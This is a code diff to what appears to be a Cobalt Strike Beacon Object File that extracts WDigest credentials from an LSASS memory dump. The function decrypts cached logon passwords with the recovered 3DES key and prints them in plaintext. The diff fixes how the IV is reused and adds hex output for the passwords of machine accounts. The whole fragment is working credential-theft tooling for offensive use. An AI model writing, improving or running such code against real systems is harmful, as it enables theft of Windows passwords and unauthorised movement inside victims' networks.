@@ -115,17 +115,28 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
 
             UCHAR* bOutput = malloc(MaxLengthOfString);
 
+            // We need to make a copy of the IV for each iteration since the InitializationVector buffer will change after BCryptDecrypt is called
+            size_t ivLen = 16;
+            unsigned char *ivCopy = (unsigned char*)malloc(ivLen);
+            memcpy(ivCopy, InitializationVector, ivLen);
+
             status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_3DES_ALGORITHM, NULL, 0);
 
             status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, Real3DesKey, i3DesKeyLength, 0);
             if (status == STATUS_SUCCESS)
             {
-                status = BCryptDecrypt(hKey, cryptoBlob, MaxLengthOfString, 0, InitializationVector, 8, bOutput, MaxLengthOfString, &cbResult, 0);
+                status = BCryptDecrypt(hKey, cryptoBlob, MaxLengthOfString, 0, ivCopy, 8, bOutput, MaxLengthOfString, &cbResult, 0);
                 if (status == STATUS_SUCCESS)
                 {
                     char AsciiPasswordString[MAX_PATH];
                     bytesWritten = WideCharToMultiByte(CP_ACP, 0, (wchar_t*)bOutput, -1, AsciiPasswordString, MAX_PATH, NULL, NULL);
-                    if (bytesWritten != 0)
+
+                    size_t usernameLength = wcslen(UserNameWideString);
+                    if (usernameLength > 0 && UserNameWideString[usernameLength - 1] == L'$') {
+                        size_t passwordLength = strlen(AsciiPasswordString);
+                        PrintHex(AsciiPasswordString, passwordLength);
+                    }
+                    else if (bytesWritten != 0)
                     {
                         BeaconFormatPrintf(&outputbuffer, "\t    * Password    : %s\n", AsciiPasswordString);
                     }
@@ -138,6 +149,7 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
                 {
                     BeaconFormatPrintf(&outputbuffer, "[!] Error in BCryptOpenAlgorithmProvider: 0x%lx\n", status);
                 }
+                free(ivCopy);
             }
             status = BCryptCloseAlgorithmProvider(hAlgorithm, 0);
             status = BCryptDestroyKey(hKey);
